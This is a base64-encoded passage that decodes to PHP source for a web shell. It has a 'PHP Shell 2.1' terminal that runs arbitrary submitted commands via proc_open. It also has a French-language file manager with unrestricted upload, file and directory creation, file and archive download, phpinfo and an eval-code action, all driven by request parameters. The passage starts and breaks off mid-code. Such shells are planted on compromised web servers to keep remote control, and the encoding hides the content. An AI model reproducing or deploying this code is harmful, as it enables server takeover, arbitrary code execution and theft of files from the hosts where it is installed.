CiAgICAgICAgICAgIHdoaWxlIChwcmVnX21hdGNoKCd8L1wuXC4oPyFcLil8JywgJG5ld19kaXIp
KQogICAgICAgICAgICAgICAgJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4o
PyFcLil8JywgJycsICRuZXdfZGlyKTsKICAgICAgICAgICAgaWYgKCRuZXdfZGlyID09ICcnKSAk
bmV3X2RpciA9ICcvJzsKICAgICAgICAgICAgaWYgKEBjaGRpcigkbmV3X2RpcikpIHsKICAgICAg
ICAgICAgICAgICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpcjsKICAgICAgICAgICAgfSBlbHNl
IHsKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNkOiBjb3VsZCBub3Qg
Y2hhbmdlIHRvOiAkbmV3X2RpclxuIjsKICAgICAgICAgICAgfQogICAgICAKICAgICAgICB9IGVs
c2VpZiAodHJpbSgkY29tbWFuZCkgPT0gJ2V4aXQnKSB7CiAgICAgICAgICAgIGxvZ291dCgpOwog
ICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOwogICAg
ICAgICAgICBpZiAoIWluaV9nZXQoJ3NhZmVfbW9kZScpKSB7CiAgICAgICAgICAgICAgICBwdXRl
bnYoJ1JPV1M9JyAuICRyb3dzKTsKICAgICAgICAgICAgICAgIHB1dGVudignQ09MVU1OUz0nIC4g
JGNvbHVtbnMpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRsZW5ndGggPSBzdHJjc3BuKCRj
b21tYW5kLCAiIFx0Iik7CiAgICAgICAgICAgICR0b2tlbiA9IHN1YnN0cigkY29tbWFuZCwgMCwg
JGxlbmd0aCk7CiAgICAgICAgICAgIGlmIChpc3NldCgkaW5pWydhbGlhc2VzJ11bJHRva2VuXSkp
CiAgICAgICAgICAgICAgICAkY29tbWFuZCA9ICRpbmlbJ2FsaWFzZXMnXVskdG9rZW5dIC4gc3Vi
c3RyKCRjb21tYW5kLCAkbGVuZ3RoKTsKICAgIAogICAgICAgICAgICAkaW8gPSBhcnJheSgpOwog
ICAgICAgICAgICAkcCA9IHByb2Nfb3BlbigkY29tbWFuZCwKICAgICAgICAgICAgICAgICAgICAg
ICAgICAgYXJyYXkoMSA9PiBhcnJheSgncGlwZScsICd3JyksCiAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIDIgPT4gYXJyYXkoJ3BpcGUnLCAndycpKSwKICAgICAgICAgICAgICAgICAg
ICAgICAgICAgJGlvKTsKICAgICAgICAgICAgd2hpbGUgKCFmZW9mKCRpb1sxXSkpIHsKICAgICAg
ICAgICAgICAgICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygk
aW9bMV0pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIEVOVF9DT01QQVQsICdVVEYtOCcpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHdo
aWxlICghZmVvZigkaW9bMl0pKSB7CiAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ291dHB1dCdd
IC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzJdKSwKICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFTlRfQ09NUEFULCAnVVRGLTgnKTsK
ICAgICAgICAgICAgfQogICAgICAgICAgICBmY2xvc2UoJGlvWzFdKTsKICAgICAgICAgICAgZmNs
b3NlKCRpb1syXSk7CiAgICAgICAgICAgIHByb2NfY2xvc2UoJHApOwogICAgICAgIH0KICAgIH0K
ICAgIGlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpIHsKICAgICAgICAkanNfY29tbWFu
ZF9oaXN0ID0gJyIiJzsKICAgIH0gZWxzZSB7CiAgICAgICAgJGVzY2FwZWQgPSBhcnJheV9tYXAo
J2FkZHNsYXNoZXMnLCAkX1NFU1NJT05bJ2hpc3RvcnknXSk7CiAgICAgICAgJGpzX2NvbW1hbmRf
aGlzdCA9ICciIiwgIicgLiBpbXBsb2RlKCciLCAiJywgJGVzY2FwZWQpIC4gJyInOwogICAgfQoK
Pz4KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIgogICAi
aHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KICA8
dGl0bGU+UEhQIFNoZWxsIDIuMTwvdGl0bGU+CiAgPHN0eWxlPgpib2R5e2ZvbnQtZmFtaWx5OnNh
bnMtc2VyaWY7Y29sb3I6YmxhY2s7YmFja2dyb3VuZDp3aGl0ZX1oMXtjb2xvcjpyZWQ7YmFja2dy
b3VuZDp3aGl0ZX1pbWd7Ym9yZGVyOm5vbmV9ZGl2I3Rlcm1pbmFse2JvcmRlcjppbnNldCAycHgg
cmVkO3BhZGRpbmc6MnB4O21hcmdpbi10b3A6MC41ZW19ZGl2I3Rlcm1pbmFsIHRleHRhcmVhe2Zv
bnQtc2l6ZToxMDAlO3dpZHRoOjEwMCU7Ym9yZGVyOm5vbmV9cHttYXJnaW4tdG9wOjAuNWVtO21h
cmdpbi1ib3R0b206MC41ZW19cCNwcm9tcHR7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO21hcmdpbjow
cHh9cCNwcm9tcHQgaW5wdXR7Ym9yZGVyOm5vbmU7Zm9udC1mYW1pbHk6bW9ub3NwYWNlfWxlZ2Vu
ZHtwYWRkaW5nLXJpZ2h0OjAuNWVtfWZpZWxkc2V0e3BhZGRpbmc6MC41ZW19LmVycm9ye2NvbG9y
OnJlZH0KICA8L3N0eWxlPgogIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KdmFyIGN1
cnJlbnRfbGluZT0wO3ZhciBjb21tYW5kX2hpc3Q9bmV3IEFycmF5KDw/cGhwIGVjaG8gJGpzX2Nv
bW1hbmRfaGlzdDs/Pik7dmFyIGxhc3Q9MDtmdW5jdGlvbiBrZXkoYSl7aWYoIWEpdmFyIGE9d2lu
ZG93LmV2ZW50O2lmKGEua2V5Q29kZT09MzgmJmN1cnJlbnRfbGluZTxjb21tYW5kX2hpc3QubGVu
Z3RoLTEpe2NvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdPWRvY3VtZW50LnNoZWxsLmNvbW1hbmQu
dmFsdWU7Y3VycmVudF9saW5lKys7ZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZT1jb21tYW5k
X2hpc3RbY3VycmVudF9saW5lXX1pZihhLmtleUNvZGU9PTQwJiZjdXJyZW50X2xpbmU+MCl7Y29t
bWFuZF9oaXN0W2N1cnJlbnRfbGluZV09ZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTtjdXJy
ZW50X2xpbmUtLTtkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlPWNvbW1hbmRfaGlzdFtjdXJy
ZW50X2xpbmVdfX1mdW5jdGlvbiBpbml0KCl7ZG9jdW1lbnQuc2hlbGwuc2V0QXR0cmlidXRlKCJh
dXRvY29tcGxldGUiLCJvZmYiKTtkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsVG9wPWRvY3Vt
ZW50LnNoZWxsLm91dHB1dC5zY3JvbGxIZWlnaHQ7ZG9jdW1lbnQuc2hlbGwuY29tbWFuZC5mb2N1
cygpfQogIDwvc2NyaXB0Pgo8L2hlYWQ+Cgo8Ym9keSBvbmxvYWQ9ImluaXQoKSI+Cgo8aDE+UEhQ
IFNoZWxsIDIuMTwvaDE+Cgo8Zm9ybSBuYW1lPSJzaGVsbCIgYWN0aW9uPSI8P3BocCBlY2hvICRf
U0VSVkVSWydQSFBfU0VMRiddID8+P3NoZWxsIiBtZXRob2Q9InBvc3QiPgoKPGZpZWxkc2V0Pgog
IDxsZWdlbmQ+Q3VycmVudCBXb3JraW5nIERpcmVjdG9yeTogPGNvZGU+PD9waHAKICAgICBlY2hv
ICBodG1sc3BlY2lhbGNoYXJzKCRfU0VTU0lPTlsnY3dkJ10sIEVOVF9DT01QQVQsICdVVEYtOCcp
OwogICAgPz48L2NvZGU+PC9sZWdlbmQ+CgoKPGRpdiBpZD0idGVybWluYWwiPgo8dGV4dGFyZWEg
bmFtZT0ib3V0cHV0IiByZWFkb25seT0icmVhZG9ubHkiIGNvbHM9Ijw/cGhwIGVjaG8gJGNvbHVt
bnMgPz4iIHJvd3M9Ijw/cGhwIGVjaG8gJHJvd3MgPz4iPgo8P3BocAokbGluZXMgPSBzdWJzdHJf
Y291bnQoJF9TRVNTSU9OWydvdXRwdXQnXSwgIlxuIik7CiRwYWRkaW5nID0gc3RyX3JlcGVhdCgi
XG4iLCBtYXgoMCwgJHJvd3MrMSAtICRsaW5lcykpOwplY2hvIHJ0cmltKCRwYWRkaW5nIC4gJF9T
RVNTSU9OWydvdXRwdXQnXSk7Cj8+CjwvdGV4dGFyZWE+CjxwIGlkPSJwcm9tcHQiPgogICQmbmJz
cDs8aW5wdXQgbmFtZT0iY29tbWFuZCIgdHlwZT0idGV4dCIKICAgICAgICAgICAgICAgIG9ua2V5
dXA9ImtleShldmVudCkiIHNpemU9Ijw/cGhwIGVjaG8gJGNvbHVtbnMtMiA/PiIgdGFiaW5kZXg9
IjEiPgo8L3A+CjwvZGl2PgoKPHA+CiAgPHNwYW4gc3R5bGU9ImZsb2F0OiByaWdodCI+U2l6ZTog
PGlucHV0IHR5cGU9InRleHQiIG5hbWU9InJvd3MiIHNpemU9IjIiCiAgbWF4bGVuZ3RoPSIzIiB2
YWx1ZT0iPD9waHAgZWNobyAkcm93cyA/PiI+ICZ0aW1lczsgPGlucHV0IHR5cGU9InRleHQiCiAg
bmFtZT0iY29sdW1ucyIgc2l6ZT0iMiIgbWF4bGVuZ3RoPSIzIiB2YWx1ZT0iPD9waHAgZWNobyAk
Y29sdW1ucwogID8+Ij48L3NwYW4+CiAgCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVj
dXRlIENvbW1hbmQiPgogIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImxvZ291dCIgdmFsdWU9
IkxvZ291dCI+CjwvcD4KCjwvZmllbGRzZXQ+CjwvZm9ybT4KCjwvYm9keT4KPC9odG1sPgo8PwoJ
ZXhpdDsKfQoKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqIENPTkZJR1VSQVRJT04gKioq
KioqKioqKioqKioqKioqKioqKioqKioqKiovCgokcHMgPSAkX1NFUlZFUlsiUEhQX1NFTEYiXTsK
aWYgKGlzc2V0KCRfR0VUWyJwYXRoIl0pIEFORCAhZW1wdHkoJF9HRVRbInBhdGgiXSkpIHsgJHBh
dGggPSB1cmxkZWNvZGUoJF9HRVRbInBhdGgiXSk7IH0gZWxzZSB7ICRwYXRoID0gIi4iOyB9Cgov
KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqIENPUkUgKioqKioqKioqKioqKioqKioq
KioqKioqKioqKioqKioqKi8KCmlmIChpc3NldCgkX0dFVFsiYWN0aW9uIl0pIEFORCAkX0dFVFsi
YWN0aW9uIl0gPT0gImFyY2hpdmUiKQp7CgkkZmlsZW5hbWUgPSB1cmxkZWNvZGUoJF9HRVRbImZp
bGVuYW1lIl0pOwoJJGZvbGRlciA9IHVybGRlY29kZSgkX0dFVFsiZm9sZGVyIl0pOwkKCSRmaWxl
ID0gTWFrZVRhcigkZm9sZGVyLCAkZmlsZW5hbWUpOwoJaWYgKGZpbGVfZXhpc3RzKCRmaWxlKSkK
CXsKICAgIGhlYWRlcignQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlcicpOwogICAg
aGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScpOwogICAgaGVh
ZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nLmJhc2VuYW1l
KCRmaWxlKSk7CiAgICBoZWFkZXIoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6IGJpbmFyeScp
OwogICAgaGVhZGVyKCdFeHBpcmVzOiAwJyk7CiAgICBoZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG11
c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCcpOwogICAgaGVhZGVyKCdQ
cmFnbWE6IHB1YmxpYycpOwogICAgaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJyAuIGZpbGVzaXpl
KCRmaWxlKSk7CiAgICBvYl9jbGVhbigpOwogICAgZmx1c2goKTsKICAgIHJlYWRmaWxlKCRmaWxl
KTsKCX0KICAgIGV4aXQ7Cn0KaWYgKGlzc2V0KCRfR0VUWyJhY3Rpb24iXSkgQU5EICRfR0VUWyJh
Y3Rpb24iXSA9PSAiZG93bmxvYWQiKQp7CgkkZmlsZW5hbWUgPSB1cmxkZWNvZGUoJF9HRVRbImZp
bGVuYW1lIl0pOwoJaWYgKGZpbGVfZXhpc3RzKCRmaWxlbmFtZSkpCgl7CiAgICBoZWFkZXIoJ0Nv
bnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXInKTsKICAgIGhlYWRlcignQ29udGVudC1U
eXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICAgIGhlYWRlcignQ29udGVudC1EaXNw
b3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Jy5iYXNlbmFtZSgkZmlsZW5hbWUpKTsKICAg
IGhlYWRlcignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Jyk7CiAgICBoZWFkZXIo
J0V4cGlyZXM6IDAnKTsKICAgIGhlYWRlcignQ2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRl
LCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0wJyk7CiAgICBoZWFkZXIoJ1ByYWdtYTogcHVibGlj
Jyk7CiAgICBoZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnIC4gZmlsZXNpemUoJGZpbGVuYW1lKSk7
CiAgICBvYl9jbGVhbigpOwogICAgZmx1c2goKTsKICAgIHJlYWRmaWxlKCRmaWxlbmFtZSk7Cgl9
CiAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoZWFkPgoJCQk8dGl0bGU+RklMRSBNQU5BR0VSPC90aXRs
ZT4KCQkJPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7
IGNoYXJzZXQ9aXNvLTg4NTktMSI+CgkJCTxtZXRhIGh0dHAtZXF1aXY9ImltYWdldG9vbGJhciIg
Y29udGVudD0ibm8iPgoJCQk8c3R5bGU+Cip7bWFyZ2luOjA7cGFkZGluZzowfWh0bWwsYm9keXto
ZWlnaHQ6MTAwJX1ib2R5e2NvbG9yOiMwMDA7Zm9udC1mYW1pbHk6Ikx1Y2lkYSBHcmFuZGUiLFZl
cmRhbmEsQXJpYWwsU2Fucy1TZXJpZjtmb250LXNpemU6MTFweDtiYWNrZ3JvdW5kLWNvbG9yOiNm
ZmZ9YXtjb2xvcjojMzMzO3RleHQtZGVjb3JhdGlvbjpub25lO291dGxpbmU6MH1hOmhvdmVye2Nv
bG9yOiNmZjY2MDA7dGV4dC1kZWNvcmF0aW9uOm5vbmV9aW1ne2JvcmRlcjowfWxhYmVse2NsZWFy
OmJvdGg7ZmxvYXQ6bGVmdDtkaXNwbGF5OmJsb2NrO21hcmdpbjowIDJweCAycHggMDtwYWRkaW5n
OjNweCA1cHggM3B4IDVweDt3aWR0aDoxNTBweDtjb2xvcjojZmZmO2JhY2tncm91bmQtY29sb3I6
I2I5ZDFmMH1pbnB1dCx0ZXh0YXJlYXtmbG9hdDpsZWZ0O21hcmdpbjowIDJweCAycHggMDtwYWRk
aW5nOjJweCA0cHggMnB4IDRweDtjb2xvcjojMDAwO2ZvbnQtZmFtaWx5OiJMdWNpZGEgR3JhbmRl
IixWZXJkYW5hLEFyaWFsLFNhbnMtU2VyaWY7Zm9udC1zaXplOjExcHg7Ym9yZGVyOjFweCBzb2xp
ZCNkZGQ7YmFja2dyb3VuZC1jb2xvcjojZmZmfXNlbGVjdHtmbG9hdDpsZWZ0O21hcmdpbjowIDJw
eCAycHggMDtwYWRkaW5nOjFweDtjb2xvcjojMDAwO2ZvbnQtZmFtaWx5OiJMdWNpZGEgR3JhbmRl
IixWZXJkYW5hLEFyaWFsLFNhbnMtU2VyaWY7Zm9udC1zaXplOjExcHg7Ym9yZGVyOjFweCBzb2xp
ZCNkZGQ7YmFja2dyb3VuZC1jb2xvcjojZmZmfWlucHV0LnN1Ym1pdHtmbG9hdDpsZWZ0O21hcmdp
bjowIDJweCAycHggMDtwYWRkaW5nOjFweCA0cHggMXB4IDRweCFpbXBvcnRhbnQ7cGFkZGluZzox
cHggNHB4IDAgNHB4O3dpZHRoOjEwMHB4fS5sZWZ0e3RleHQtYWxpZ246bGVmdH0uY2VudGVye3Rl
eHQtYWxpZ246Y2VudGVyfS5yaWdodHt0ZXh0LWFsaWduOnJpZ2h0fS5qdXN0aWZ5e3RleHQtYWxp
Z246anVzdGlmeX0uaGlkZGVue2Rpc3BsYXk6bm9uZX1zcGFuLmxhYmVse2NsZWFyOmJvdGg7Zmxv
YXQ6bGVmdDtkaXNwbGF5OmJsb2NrO21hcmdpbjowIDJweCAycHggMDtwYWRkaW5nOjNweCA1cHgg
M3B4IDVweDt3aWR0aDoxNTBweDtjb2xvcjojZmZmO2JhY2tncm91bmQtY29sb3I6I2I5ZDFmMH1z
cGFuLmlucHV0e2Zsb2F0OmxlZnQ7bWFyZ2luOjAgMnB4IDJweCAwO3BhZGRpbmc6M3B4IDVweCAz
cHggNXB4O3dpZHRoOjUwMHB4fWRpdiNjb250YWluZXJ7cG9zaXRpb246YWJzb2x1dGU7d2lkdGg6
MTAwJTtoZWlnaHQ6MTAwJX1kaXYjY29udGFpbmVyIGRpdiNtZW51e3Bvc2l0aW9uOmFic29sdXRl
O2xlZnQ6MDt3aWR0aDoyMDBweDtoZWlnaHQ6YXV0byFpbXBvcnRhbnQ7aGVpZ2h0OjEwMCU7bWlu
LWhlaWdodDoxMDAlO2JvcmRlci1yaWdodDoxcHggc29saWQjYjlkMWYwO2JhY2tncm91bmQtY29s
b3I6I2VmZjVmZn1kaXYjY29udGFpbmVyIGRpdiNtZW51IGRpdiNjbG9zZXttYXJnaW46NXB4IDVw
eCAxMHB4IDA7aGVpZ2h0OjlweH1kaXYjY29udGFpbmVyIGRpdiNtZW51IGRpdiNjbG9zZSBhe2Zs
b2F0OnJpZ2h0O2Rpc3BsYXk6YmxvY2s7d2lkdGg6OXB4O2hlaWdodDo5cHh9ZGl2I2NvbnRhaW5l
ciBkaXYjbWVudSBoMXttYXJnaW46MCAwIDJweCAwO2ZvbnQtc2l6ZToxMXB4O2ZvbnQtd2VpZ2h0
Om5vcm1hbH1kaXYjY29udGFpbmVyIGRpdiNtZW51IGgxIGF7ZGlzcGxheTpibG9jaztwYWRkaW5n
OjFweCAxMHB4IDJweCAzMXB4O2JhY2tncm91bmQtcG9zaXRpb246MTBweCAwfWRpdiNjb250YWlu
ZXIgZGl2I21lbnUgZGl2LnNlcGFyYXRvcntjbGVhcjpib3RoO21hcmdpbjowIDAgNXB4IDA7aGVp
Z2h0OjVweDtmb250LXNpemU6MDtib3JkZXItYm90dG9tOjFweCBkYXNoZWQjYjlkMWYwfWRpdi5s
aW5le2NsZWFyOmJvdGg7aGVpZ2h0OjEwcHg7Zm9udC1zaXplOjB9ZGl2I2NvbnRhaW5lciBkaXYu
bWVudUlzTm90SGlkZGVue21hcmdpbjowIDAgMCAyMDFweH1kaXYjY29udGFpbmVyIGRpdi5tZW51
SXNIaWRkZW57bWFyZ2luOjB9ZGl2I2NvbnRhaW5lciBkaXYjY29udGVudHtwYWRkaW5nOjEwcHh9
ZGl2I2NvbnRhaW5lciBkaXYjY29udGVudCBoMXtwYWRkaW5nOjJweCA1cHggMnB4IDVweDtjb2xv
cjojZmZmO2ZvbnQtZmFtaWx5OiJMdWNpZGEgR3JhbmRlIixWZXJkYW5hLEFyaWFsLFNhbnMtU2Vy
aWY7Zm9udC1zaXplOjE0cHg7YmFja2dyb3VuZC1jb2xvcjojYjlkMWYwfWRpdiNjb250YWluZXIg
ZGl2I2NvbnRlbnQgZGl2e3BhZGRpbmc6MTBweCAxMHB4IDAgMTBweH1kaXYjY29udGFpbmVyIGRp
diNjb250ZW50IGRpdi5saW5le2NsZWFyOmJvdGg7cGFkZGluZzowO2hlaWdodDowO2ZvbnQtc2l6
ZTowfWRpdiNjb250YWluZXIgZGl2I2NvbnRlbnQgcHtwYWRkaW5nOjEwcHggMTBweCAwIDEwcHh9
CgkJCTwvc3R5bGU+CgkJPC9oZWFkPjxib2R5PgoJCQk8ZGl2IGlkPSJjb250YWluZXIiPgoJCQkJ
PGRpdiBpZD0ibWVudSI+CgkJCQkJPGRpdiBpZD0iY2xvc2UiPjwvZGl2PgoJCQkJCTxoMT48YSBo
cmVmPSI8PyBlY2hvICRwczsgPz4/cGF0aD08PyBlY2hvICRwYXRoOyA/PiI+RXhwbG9yYXRldXIg
c2ltcGxlPC9hPjwvaDE+CgkJCQkJPGRpdiBjbGFzcz0ic2VwYXJhdG9yIj48L2Rpdj4KCQkJCQk8
aDE+PGEgaHJlZj0iPD8gZWNobyAkcHM7ID8+P2FjdGlvbj1ta2RpciZwYXRoPTw/IGVjaG8gJHBh
dGg7ID8+Ij5DcmVlciB1biBkb3NzaWVyPC9hPjwvaDE+CgkJCQkJPGRpdiBjbGFzcz0ic2VwYXJh
dG9yIj48L2Rpdj4KCQkJCQk8aDE+PGEgaHJlZj0iPD8gZWNobyAkcHM7ID8+P2FjdGlvbj10b3Vj
aCZwYXRoPTw/IGVjaG8gJHBhdGg7ID8+Ij5DcmVlciB1biBmaWNoaWVyPC9hPjwvaDE+CgkJCQkJ
PGRpdiBjbGFzcz0ic2VwYXJhdG9yIj48L2Rpdj4KCQkJCQk8aDE+PGEgaHJlZj0iPD8gZWNobyAk
cHM7ID8+P2FjdGlvbj11cGxvYWQmcGF0aD08PyBlY2hvICRwYXRoOyA/PiI+VXBsb2FkZXIgdW4g
ZmljaGllcjwvYT48L2gxPgoJCQkJCTxkaXYgY2xhc3M9InNlcGFyYXRvciI+PC9kaXY+CgkJCQkJ
PGgxPjxhIGhyZWY9Ijw/IGVjaG8gJHBzOyA/Pj9hY3Rpb249ZXZhbCZwYXRoPTw/IGVjaG8gJHBh
dGg7ID8+Ij5FdmFsdWVyIGR1IGNvZGU8L2E+PC9oMT4KCQkJCQk8ZGl2IGNsYXNzPSJzZXBhcmF0
b3IiPjwvZGl2PgoJCQkJCTxoMT48YSBocmVmPSI8PyBlY2hvICRwczsgPz4/YWN0aW9uPXBocGlu
Zm8mcGF0aD08PyBlY2hvICRwYXRoOyA/PiI+UEhQIEluZm9zPC9hPjwvaDE+CgkJCQkJPGRpdiBj
bGFzcz0ic2VwYXJhdG9yIj48L2Rpdj4KCQkJCQk8aDE+PGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9
Ijw/IGVjaG8gJHBzOyA/Pj9zaGVsbCI+UEhQIFNoZWxsPC9hPjwvaDE+CgkJCQkJPGRpdiBjbGFz
cz0ic2VwYXJhdG9yIj48L2Rpdj4KCQkJCQk8ZGl2IGNsYXNzPSJsaW5lIj48L2Rpdj4KCQkJCTwv
ZGl2PgoJCQkJPGRpdiBpZD0ibWFpbiIgY2xhc3M9Im1lbnVJc05vdEhpZGRlbiI+CgkJCQkJPGRp
diBpZD0iY29udGVudCI+CgkJCQkJCTxoMT5FeHBsb3JhdGV1cjwvaDE+CgkJCQkJCTxkaXY+Cjw/
CglpZiAoaXNzZXQoJF9HRVRbImFjdGlvbiJdKSBBTkQgIWVtcHR5KCRfR0VUWyJhY3Rpb24iXSkp
Cgl7CgkJaWYgKCRfR0VUWyJhY3Rpb24iXSA9PSAidXBsb2FkIikKCQl7CgkJCWlmICghZW1wdHko
JF9GSUxFUykpCgkJCXsKCQkJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sidXBsb2Fk
Il1bInRtcF9uYW1lIl0sICRwYXRoLiIvIi4kX0ZJTEVTWyJ1cGxvYWQiXVsibmFtZSJdKSkKCQkJ
CQlNZXNzYWdlKCJsZSBmaWNoaWVyIGEgYmllbiAmZWFjdXRlO3QmZWFjdXRlOyB1cGxvYWQmZWFj
dXRlOy4iKTsKCQkJCWVsc2UKCQkJCQlNZXNzYWdlICgiVW5lIGVycmV1ciBlc3Qgc3VydmVudWUg
cGVuZGFudCBsJ3VwbG9hZCBkdSBmaWNoaWVyLiIpOwoJCQl9CgkJCT8+CgkJCQkJCQk8Zm9ybSBt
ZXRob2Q9InBvc3QiIGFjdGlvbj0iPD8gZWNobyAkcHM7ID8+P2FjdGlvbj11cGxvYWQmcGF0aD08
PyBlY2hvICRwYXRoOyA/PiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CgkJCQkJCQkJ
PGxhYmVsPlVwbG9hZGVyIHVuIGZpY2hpZXIgOjwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5h
bWU9InVwbG9hZCIgLz4KCQkJCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQi
IHZhbHVlPSJHbyAhIi8+CgkJCQkJCQk8L2Zvcm0+PGJyIC8+PGJyIC8+CgkJCTw/CgkJfQoJCWVs
c2UgaWYgKCRfR0VUWyJhY3Rpb24iXSA9PSAibWtkaXIiKQoJCXsKCQkJaWYgKCFlbXB0eSgkX1BP
U1QpKQoJCQl7CgkJCQkkZm9sZGVyID0gJHBhdGguIi8iLnVybGRlY29kZSgkX1BPU1RbImZvbGRl
ciJdKTsKCQkJCWlmICghaXNfZGlyKCRmb2xkZXIpKQoJCQkJewoJCQkJCWlmIChta2RpcigkZm9s
ZGVyLCA3NzcsIHRydWUpKQoJCQkJCQlNZXNzYWdlKCJMZSBkb3NzaWVyIGEgYmllbiAmZWFjdXRl
O3QmZWFjdXRlOyBjciZlYWN1dGU7JmVhY3V0ZTsuIik7CgkJCQkJZWxzZQoJCQkJCQlNZXNzYWdl
KCJMZSBkb3NzaWVyIG4nYSBwYXMgcHUgZXRyZSBjciZlYWN1dGU7JmVhY3V0ZTsuIik7CgkJCQl9
CgkJCQllbHNlCgkJCQkJTWVzc2FnZSgiQ2UgZG9zc2llciBleGlzdGUgZGVqYS4iKTsKCQkJfQoJ
CQk/PgoJCQkJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/IGVjaG8gJHBzOyA/Pj9h
Y3Rpb249bWtkaXImcGF0aD08PyBlY2hvICRwYXRoOyA/PiI+CgkJCQkJCQk8bGFiZWw+Q3JlZXIg
dW4gZG9zc2llciA6PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZm9sZGVyIiAvPgoJ
CQkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1Ym1pdCIgdmFsdWU9IkdvICEiLz4K
CQkJCQkJCTwvZm9ybT48YnIgLz48YnIgLz4KCQkJPD8KCQl9CgkJZWxzZSBpZiAoJF9HRVRbImFj
dGlvbiJdID09ICJ0b3VjaCIpCgkJewoJCQlpZiAoIWVtcHR5KCRfUE9TVCkpCgkJCXsKCQkJCSRm
aWxlID0gJHBhdGguIi8iLnVybGRlY29kZSgkX1BPU1RbImZpbGUiXSk7CgkJCQlpZiAoIWZpbGVf
ZXhpc3RzKCRmaWxlKSkKCQkJCXsKCQkJCQlpZiAoJGhhbmRsZSA9IGZvcGVuKCRmaWxlLCAidysi
KSkKCQkJCQl7CgkJCQkJCU1lc3NhZ2UoIkxlIGZpY2hpZXIgYSBiaWVuICZlYWN1dGU7dCZlYWN1
dGU7IGNyJmVhY3V0ZTsmZWFjdXRlOy4iKTsKCQkJCQkJZmNsb3NlKCRoYW5kbGUpOwoJCQkJCX0K
CQkJCQllbHNlCgkJCQkJCU1lc3NhZ2UoIkxlIGZpY2hpZXIgbidhIHBhcyBwdSBldHJlIGNyJmVh
Y3V0ZTsmZWFjdXRlOy4iKTsKCQkJCX0KCQkJCWVsc2UKCQkJCQlNZXNzYWdlKCJDZSBmaWNoaWVy
IGV4aXN0ZSBkZWphLiIpOwoJCQl9CgkJCT8+CgkJCQkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFj
dGlvbj0iPD8gZWNobyAkcHM7ID8+P2FjdGlvbj10b3VjaCZwYXRoPTw/IGVjaG8gJHBhdGg7ID8+
Ij4KCQkJCQkJCTxsYWJlbD5DcmVlciB1biBmaWNoaWVyIDo8L2xhYmVsPjxpbnB1dCB0eXBlPSJ0
ZXh0IiBuYW1lPSJmaWxlIiAvPgoJCQkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1
Ym1pdCIgdmFsdWU9IkdvICEiLz4KCQkJCQkJCTwvZm9ybT48YnIgLz48YnIgLz4KCQkJPD8KCQl9
CgkJZWxzZSBpZiAoJF9HRVRbImFjdGlvbiJdID09ICJldmFsIikKCQl7CgkJCWlmICghZW1wdHko
